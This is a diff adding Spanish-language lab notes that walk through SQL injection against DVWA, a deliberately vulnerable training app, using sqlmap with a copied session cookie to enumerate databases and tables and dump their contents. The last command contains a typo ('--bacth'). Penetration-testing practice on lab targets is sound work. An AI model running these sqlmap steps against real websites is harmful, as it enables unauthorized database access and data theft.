@@ -1,1 +1,13 @@
-++ dvwa ---> security: low
+++ Web
+--- dvwa ---> security: low
+
+++ Terminal
+--- sqlmap <url_copiada> --cookie='PHPSESSID=<valor_copiado>; security=low' --batch
+--- Enter
+---- Se mostrarán las vulnerabilidades vinculadas
+--- sqlmap <url_copiada> --cookie='PHPSESSID=<valor_copiado>; security=low' --dbs --batch
+---- Se mostrarán todas las bases de datos asociadas
+--- sqlmap <url_copiada> --cookie='PHPSESSID=<valor_copiado>; security=low' -D <nombre_base_de_datos> --tables  --batch
+---- Se mostrarán las tablas asociadas a la base de datos
+--- sqlmap <url_copiada> --cookie='PHPSESSID=<valor_copiado>; security=low' -D <nombre_base_de_datos> -T <nombre_tabla> --dump-all --bacth
+---- Se mostrará toda la información correspondiente a la tabla
